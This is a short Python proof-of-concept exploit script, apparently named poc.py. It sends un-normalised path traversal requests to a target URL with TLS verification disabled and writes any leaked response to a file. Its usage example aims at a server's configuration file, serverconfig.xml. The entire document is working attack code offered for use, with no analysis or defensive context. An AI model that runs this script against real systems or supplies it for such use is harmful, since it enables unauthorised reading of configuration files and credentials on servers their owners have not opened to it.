import ssl
import sys
import http.client
from urllib.parse import urlparse

def send_path_traversal_request(url: str, traversal_path: str) -> bool:
    """
    Send a raw HTTP request to exploit path traversal without normalization
    """
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    if parsed.scheme == "https":
        context = ssl._create_unverified_context()
        conn = http.client.HTTPSConnection(host, port, context=context, timeout=30)
    else:
        conn = http.client.HTTPConnection(host, port, timeout=30)

    headers = {
        "Host": host,
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Connection": "close",
        "User-Agent": "Mozilla/5.0 (compatible; exploit-script/1.0)"
    }

    try:
        print(f"[DEBUG] Sending request to: {traversal_path}")
        conn.request("GET", traversal_path, headers=headers)
        response = conn.getresponse()

        body = response.read()
        status_code = response.status

        print(f"[DEBUG] Status Code: {status_code}")
        print(f"[DEBUG] Response Snippet:\n{body[:500]}")

        if status_code == 200 and len(body) > 100:
            with open("leaked_output.txt", "wb") as f:
                f.write(body)
            print("[+] Saved leaked output to leaked_output.txt")
            return True
        else:
            return False

    except Exception as e:
        print(f"Request error: {e}")
        return False
    finally:
        conn.close()

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 poc.py <url> <path>")
        print('Example: python3 poc.py http://ip "/toolbox-resource/../resource1/../../configuration/serverconfig.xml"')
        sys.exit(1)

    url = sys.argv[1]
    path = sys.argv[2]

    result = send_path_traversal_request(url, path)
    if result:
        print(f"[+] {url} is vulnerable")
    else:
        print(f"[-] {url} is not vulnerable")

if __name__ == "__main__":
    main()
